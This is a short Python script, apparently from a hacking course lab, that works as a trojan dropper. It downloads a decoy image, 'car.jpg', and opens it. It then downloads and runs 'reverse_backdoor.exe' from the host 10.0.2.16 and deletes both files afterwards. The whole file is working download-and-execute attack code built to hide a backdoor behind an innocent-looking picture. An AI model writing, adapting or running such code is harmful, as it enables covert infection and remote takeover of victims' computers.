#!/usr/bin.env python

import requests, subprocess, os, tempfile
import re

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)



temp_directory = tempfile.gettempdir() # Get the temporary directory
os.chdir(temp_directory) # Change the current working directory to the temporary directory
download("http://10.0.2.16/evil-files/car.jpg")
subprocess.Popen("car.jpg", shell=True) # Open the downloaded image file

download("http://10.0.2.16/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True) # Open the downloaded image file


os.remove("car.jpg") # Remove the downloaded image file
os.remove("reverse_backdoor.exe") # Remove the downloaded file
# The script downloads an image file and a reverse backdoor executable file from a specified URL,
# opens the image file, and executes the reverse backdoor executable file.